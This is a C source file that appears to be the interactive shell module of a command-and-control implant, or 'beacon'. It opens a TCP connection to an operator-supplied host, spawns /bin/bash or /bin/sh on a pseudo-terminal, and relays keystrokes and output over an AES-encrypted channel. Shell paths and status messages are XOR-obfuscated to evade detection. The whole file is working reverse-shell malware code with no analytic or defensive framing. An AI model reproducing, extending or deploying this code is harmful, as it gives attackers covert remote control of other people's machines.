#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <pty.h>
#include <termios.h>

#include "exec/shell.h"
#include "comms/session.h"
#include "protocol/crypto.h"
#include "util/obf.h"
#include "obf_strings.h"
#include "protocol.h"
#include "beacon.h"

/* ------------------------------------------------------------------ */
/*  Global shell state                                                  */
/* ------------------------------------------------------------------ */

static volatile int      g_shell_active  = 0;
static int               g_master_fd     = -1;
static int               g_shell_sock    = -1;
static int               g_session_sock  = -1;
static pid_t             g_child_pid     = -1;
static pthread_t         g_reader_tid;
static pthread_t         g_writer_tid;
static uint8_t           g_shell_key[32];
static uint32_t          g_shell_beacon_id;
static pthread_mutex_t   g_shell_sock_mutex = PTHREAD_MUTEX_INITIALIZER;

/* ------------------------------------------------------------------ */
/*  shell_envelope_write -- mutex-protected envelope write to shell sock */
/* ------------------------------------------------------------------ */

static int shell_envelope_write(const uint8_t *data, int len) {
    if (g_shell_sock < 0) return -1;
    pthread_mutex_lock(&g_shell_sock_mutex);
    int rc = session_write(g_shell_sock, data, len);
    pthread_mutex_unlock(&g_shell_sock_mutex);
    return rc;
}

/* ------------------------------------------------------------------ */
/*  shell_reader_fn -- PTY -> Shell TCP                                 */
/* ------------------------------------------------------------------ */

static void *shell_reader_fn(void *arg) {
    (void)arg;
    uint8_t buf[4096];

    while (__atomic_load_n(&g_shell_active, __ATOMIC_ACQUIRE)) {
        int n = (int)read(g_master_fd, buf, sizeof(buf));
        if (n <= 0) {
            /* child exited or PTY closed */
            break;
        }

        /* Build TASK_SHELL_OUTPUT packet: header + [4B LE len] + raw bytes */
        size_t body_len = 4 + (size_t)n;
        size_t pkt_len  = 16 + body_len;
        uint8_t *pkt = malloc(pkt_len);
        if (!pkt) break;

        task_header_t hdr = {0};
        hdr.type   = TASK_SHELL_OUTPUT;
        hdr.code   = 0;
        hdr.flags  = FLAG_NONE;
        hdr.label  = 0;
        hdr.length = (uint32_t)body_len;
        encode_header(&hdr, pkt);

        pkt[16] = (uint8_t)(n);
        pkt[17] = (uint8_t)(n >> 8);
        pkt[18] = (uint8_t)(n >> 16);
        pkt[19] = (uint8_t)(n >> 24);
        memcpy(pkt + 20, buf, (size_t)n);

        size_t enc_len = pkt_len + 64;
        uint8_t *enc = malloc(enc_len);
        if (enc) {
            if (aes_encrypt(g_shell_key, pkt, pkt_len, enc, &enc_len) == 0) {
                shell_envelope_write(enc, (int)enc_len);
            }
            free(enc);
        }
        free(pkt);
    }

    /* Send "shell exited" notification on shell TCP */
    {
        char exit_msg[32];
        xor_dec(exit_msg, ENC_SHELL_EXITED, ENC_SHELL_EXITED_LEN);
        uint32_t msg_len = (uint32_t)strlen(exit_msg);
        uint32_t body_len = 4 + msg_len;
        uint32_t pkt_len = TASK_HEADER_SIZE + body_len;
        uint8_t *pkt = malloc(pkt_len);
        if (pkt) {
            task_header_t hdr = {0};
            hdr.type   = TASK_SHELL_OUTPUT;
            hdr.flags  = FLAG_ERROR;
            hdr.length = body_len;
            encode_header(&hdr, pkt);
            pkt[TASK_HEADER_SIZE]     = (uint8_t)(msg_len);
            pkt[TASK_HEADER_SIZE + 1] = (uint8_t)(msg_len >> 8);
            pkt[TASK_HEADER_SIZE + 2] = (uint8_t)(msg_len >> 16);
            pkt[TASK_HEADER_SIZE + 3] = (uint8_t)(msg_len >> 24);
            memcpy(pkt + TASK_HEADER_SIZE + 4, exit_msg, msg_len);
            size_t enc_max = pkt_len + 64;
            uint8_t *enc = malloc(enc_max);
            if (enc) {
                size_t enc_len = enc_max;
                if (aes_encrypt(g_shell_key, pkt, pkt_len, enc, &enc_len) == 0) {
                    shell_envelope_write(enc, (int)enc_len);
                }
                free(enc);
            }
            free(pkt);
        }
    }

    __atomic_store_n(&g_shell_active, 0, __ATOMIC_RELEASE);
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  shell_writer_fn -- Shell TCP -> PTY                                 */
/* ------------------------------------------------------------------ */

static void *shell_writer_fn(void *arg) {
    (void)arg;

    while (__atomic_load_n(&g_shell_active, __ATOMIC_ACQUIRE)) {
        uint8_t *enc_data = malloc(MAX_ENVELOPE);
        if (!enc_data) break;

        int enc_len = 0;
        if (session_read(g_shell_sock, enc_data, &enc_len) != 0) {
            free(enc_data);
            break;
        }

        size_t plain_len = (size_t)enc_len + 64;
        uint8_t *plain = malloc(plain_len);
        if (!plain) { free(enc_data); break; }

        if (aes_decrypt(g_shell_key, enc_data, (size_t)enc_len,
                        plain, &plain_len) != 0 || plain_len < 16) {
            free(plain); free(enc_data);
            break;
        }
        free(enc_data);

        task_header_t hdr;
        decode_header(plain, &hdr);
        uint32_t task_data_len = hdr.length;
        const uint8_t *task_data = (16 + task_data_len <= (uint32_t)plain_len)
                                    ? plain + 16 : NULL;

        if (hdr.type == TASK_SHELL_INPUT && task_data && task_data_len >= 4) {
            uint32_t input_len = (uint32_t)task_data[0]
                               | ((uint32_t)task_data[1] << 8)
                               | ((uint32_t)task_data[2] << 16)
                               | ((uint32_t)task_data[3] << 24);
            if (input_len <= task_data_len - 4) {
                /* write input bytes to PTY master */
                (void)write(g_master_fd, task_data + 4, input_len);
            }
        }
        else if (hdr.type == TASK_SHELL_STOP) {
            free(plain);
            break;
        }

        free(plain);
    }

    __atomic_store_n(&g_shell_active, 0, __ATOMIC_RELEASE);
    return NULL;
}

/* ------------------------------------------------------------------ */
/*  shell_handshake -- send beacon_id + CONN_SHELL + encrypted confirm  */
/* ------------------------------------------------------------------ */

static int shell_handshake(int sock, uint32_t beacon_id,
                           const uint8_t session_key[32]) {
    uint8_t id_buf[4];
    id_buf[0] = (uint8_t)(beacon_id);
    id_buf[1] = (uint8_t)(beacon_id >> 8);
    id_buf[2] = (uint8_t)(beacon_id >> 16);
    id_buf[3] = (uint8_t)(beacon_id >> 24);

    /* 4B beacon_id + 1B CONN_SHELL */
    uint8_t handshake[5];
    memcpy(handshake, id_buf, 4);
    handshake[4] = CONN_SHELL;

    /* send_all inline (no MSG_NOSIGNAL abstraction here) */
    int sent = 0;
    while (sent < 5) {
        int n = (int)send(sock, handshake + sent, (size_t)(5 - sent), MSG_NOSIGNAL);
        if (n <= 0) return -1;
        sent += n;
    }

    /* AES-encrypt beacon_id, send as envelope */
    uint8_t enc_buf[128];
    size_t enc_len = sizeof(enc_buf);
    if (aes_encrypt(session_key, id_buf, 4, enc_buf, &enc_len) != 0) return -1;
    if (session_write(sock, enc_buf, (int)enc_len) != 0) return -1;

    return 0;
}

/* ------------------------------------------------------------------ */
/*  shell_start                                                         */
/* ------------------------------------------------------------------ */

int shell_start(const char *host, uint16_t port,
                uint8_t *session_key, uint32_t beacon_id, uint32_t label,
                int session_sock) {
    if (__atomic_load_n(&g_shell_active, __ATOMIC_ACQUIRE))
        return -1;

    /* Open dedicated TCP connection for shell I/O */
    int shell_sock = session_connect(host, port);
    if (shell_sock < 0) return -1;

    if (shell_handshake(shell_sock, beacon_id, session_key) != 0) {
        close(shell_sock);
        return -1;
    }

    /* Setup PTY window size */
    struct winsize ws;
    memset(&ws, 0, sizeof(ws));
    ws.ws_col = SHELL_COLS;
    ws.ws_row = SHELL_ROWS;

    int master_fd = -1;
    pid_t child_pid = forkpty(&master_fd, NULL, NULL, &ws);
    if (child_pid < 0) {
        close(shell_sock);
        return -1;
    }

    if (child_pid == 0) {
        /* child */
        setsid();
        char bash_path[16];
        xor_dec(bash_path, ENC_BIN_BASH, ENC_BIN_BASH_LEN);
        execl(bash_path, bash_path, NULL);
        char sh_path[16];
        xor_dec(sh_path, ENC_BIN_SH, ENC_BIN_SH_LEN);
        execl(sh_path, sh_path, NULL);
        _exit(127);
    }

    /* parent: store globals */
    g_master_fd       = master_fd;
    g_shell_sock      = shell_sock;
    g_session_sock    = session_sock;
    g_child_pid       = child_pid;
    g_shell_beacon_id = beacon_id;
    memcpy(g_shell_key, session_key, 32);

    __atomic_store_n(&g_shell_active, 1, __ATOMIC_RELEASE);

    if (pthread_create(&g_reader_tid, NULL, shell_reader_fn, NULL) != 0) {
        __atomic_store_n(&g_shell_active, 0, __ATOMIC_RELEASE);
        kill(child_pid, SIGKILL);
        waitpid(child_pid, NULL, 0);
        close(master_fd);
        close(shell_sock);
        return -1;
    }

    if (pthread_create(&g_writer_tid, NULL, shell_writer_fn, NULL) != 0) {
        __atomic_store_n(&g_shell_active, 0, __ATOMIC_RELEASE);
        pthread_join(g_reader_tid, NULL);
        kill(child_pid, SIGKILL);
        waitpid(child_pid, NULL, 0);
        close(master_fd);
        close(shell_sock);
        return -1;
    }

    /* notify operator session: shell started */
    char msg[32];
    xor_dec(msg, ENC_SHELL_STARTED, ENC_SHELL_STARTED_LEN);
    send_result_session(session_sock, label, TASK_SHELL_START, 0,
                        FLAG_NONE, msg, session_key);

    return 0;
}

/* ------------------------------------------------------------------ */
/*  shell_stop                                                          */
/* ------------------------------------------------------------------ */

void shell_stop(void) {
    if (!__atomic_load_n(&g_shell_active, __ATOMIC_ACQUIRE))
        return;

    __atomic_store_n(&g_shell_active, 0, __ATOMIC_RELEASE);

    /* terminate child */
    if (g_child_pid > 0) {
        kill(g_child_pid, SIGTERM);
        usleep(100000); /* 100ms */
        int status = 0;
        if (waitpid(g_child_pid, &status, WNOHANG) == 0) {
            kill(g_child_pid, SIGKILL);
            waitpid(g_child_pid, NULL, 0);
        }
        g_child_pid = -1;
    }

    /* shutdown sockets to unblock threads blocked in recv/read */
    if (g_shell_sock >= 0)
        shutdown(g_shell_sock, SHUT_RDWR);
    if (g_master_fd >= 0)
        close(g_master_fd);
    g_master_fd = -1;

    /* join threads (now unblocked by shutdown/close) */
    pthread_join(g_reader_tid, NULL);
    pthread_join(g_writer_tid, NULL);

    /* close socket after threads have exited */
    if (g_shell_sock >= 0) {
        close(g_shell_sock);
        g_shell_sock = -1;
    }
}

/* ------------------------------------------------------------------ */
/*  shell_is_active                                                     */
/* ------------------------------------------------------------------ */

int shell_is_active(void) {
    return __atomic_load_n(&g_shell_active, __ATOMIC_ACQUIRE);
}
